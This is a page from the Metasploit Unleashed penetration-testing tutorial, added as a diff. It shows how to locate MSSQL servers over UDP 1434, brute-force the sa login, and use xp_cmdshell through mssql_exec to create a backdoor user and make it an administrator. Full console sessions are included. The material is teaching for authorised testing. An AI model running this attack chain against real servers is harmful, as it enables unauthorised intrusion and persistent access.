@@ -1,0 +1,64 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Hunting For MSSQL</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Hunting
+For MSSQL</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">One of my personal favorites is the
+advanced UDP footprinting of
+MSSQL servers. If you're performing an internal penetration test this
+is a must use tool. When MSSQL installs, it installs either on port
+1433 TCP or a randomized dynamic TCP port. If the port is dynamically
+generated, this can be rather tricky for an attacker to find the MSSQL
+servers to attack. Luckily with Microsoft, they have blessed us with
+port 1434 UDP that once queried allows you to pull quite a bit of
+information about the SQL server including what port the TCP listener
+is on. Let's load the module and use it to discover multiple servers.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf &gt; search mssql<br>[*] Searching loaded modules for pattern 'mssql'...<br><br>Exploits<br>========<br><br>   Name                                       Description<br>   ----                                       -----------<br>   windows/mssql/lyris_listmanager_weak_pass  Lyris ListManager MSDE Weak sa Password<br>   windows/mssql/ms02_039_slammer             Microsoft SQL Server Resolution Overflow<br>   windows/mssql/ms02_056_hello               Microsoft SQL Server Hello Overflow<br>   windows/mssql/mssql_payload                Microsoft SQL Server Payload Execution<br><br><br>Auxiliary<br>=========<br><br>   Name                       Description<br>   ----                       -----------<br>   admin/mssql/mssql_enum     Microsoft SQL Server Configuration Enumerator<br>   admin/mssql/mssql_exec     Microsoft SQL Server xp_cmdshell Command Execution<br>   admin/mssql/mssql_sql      Microsoft SQL Server Generic Query<br>   scanner/mssql/mssql_login  MSSQL Login Utility<br>   scanner/mssql/mssql_ping   MSSQL Ping Utility<br><br>msf &gt; use scanner/mssql/mssql_ping<br>msf auxiliary(mssql_ping) &gt; show options<br><br>Module options:<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   RHOSTS                    yes       The target address range or CIDR identifier<br>   THREADS  1                yes       The number of concurrent threads<br><br>msf auxiliary(mssql_ping) &gt; set RHOSTS 10.211.55.1/24<br>RHOSTS =&gt; 10.211.55.1/24<br>msf auxiliary(mssql_ping) &gt; exploit<br><br>[*] SQL Server information for 10.211.55.128:<br>[*] tcp = 1433<br>[*] np = SSHACKTHISBOX-0pipesqlquery<br>[*] Version = 8.00.194<br>[*] InstanceName = MSSQLSERVER<br>[*] IsClustered = No<br>[*] ServerName = SSHACKTHISBOX-0<br>[*] Auxiliary module execution completed</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">The first command we issued was to
+search for any 'mssql' plugins.
+The second set of instructions was the 'use scanner/mssql/mssql_ping',
+this will load the scanner module for us. Next, 'show options' allows
+us to see what we need to specify. The 'set RHOSTS 10.211.55.1/24' sets
+the subnet range we want to start looking for SQL servers on. You could
+specify a /16 or whatever you want to go after. I would recommend
+increasing the number of threads as this could take a long time with a
+single threaded scanner.
+</span>
+<p style="color: rgb(0, 0, 0);">After the 'run' command is issued, a
+scan is going to be performed
+and pull back specific information about the MSSQL server. As we can
+see, the name of the machine is "SSHACKTHISBOX-0" and the TCP port is
+running on 1433. At this point you could use the
+'scanner/mssql/mssql_login' module to brute-force the password by
+passing the module a dictionary file. Alternatively, you could also use
+Fast-Track, medusa, or hydra to do this. Once you successfully guess
+the password, there's a neat little module for executing the
+xp_cmdshell stored procedure.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf auxiliary(mssql_login) &gt; use admin/mssql/mssql_exec<br>msf auxiliary(mssql_exec) &gt; show options<br><br>Module options:<br><br>   Name        Current Setting                                       Required  Description<br>   ----        ---------------                                       --------  -----------<br>   CMD         cmd.exe /c echo OWNED &gt; C:\owned.exe                  no        Command to execute<br>   HEX2BINARY  /pentest/exploits/framework3/data/exploits/mssql/h2b  no        The path to the hex2binary script on the disk<br>   MSSQL_PASS                                                        no        The password for the specified username<br>   MSSQL_USER  sa                                                    no        The username to authenticate as<br>   RHOST                                                             yes       The target address<br>   RPORT       1433                                                  yes       The target port<br><br><br>msf auxiliary(mssql_exec) &gt; set RHOST 10.211.55.128<br>RHOST =&gt; 10.211.55.128<br>msf auxiliary(mssql_exec) &gt; set MSSQL_PASS password<br>MSSQL_PASS =&gt; password<br>msf auxiliary(mssql_exec) &gt; set CMD net user rel1k ihazpassword /ADD<br>cmd =&gt; net user rel1k ihazpassword /ADD<br>msf auxiliary(mssql_exec) &gt; exploit<br><br>The command completed successfully.<br><br>[*] Auxiliary module execution completed</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">Looking at the output of the 'net
+user rel1k ihazpassword /ADD', we
+have successfully added a user account named "rel1k", from there we
+could issue 'net localgroup administrators rel1k /ADD' to get a local
+administrator on the system itself. We have full control over this
+system at this point. </span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Information_Gathering"
+ title="Information Gathering">Information Gathering</a></div>
+</body>
+</html>
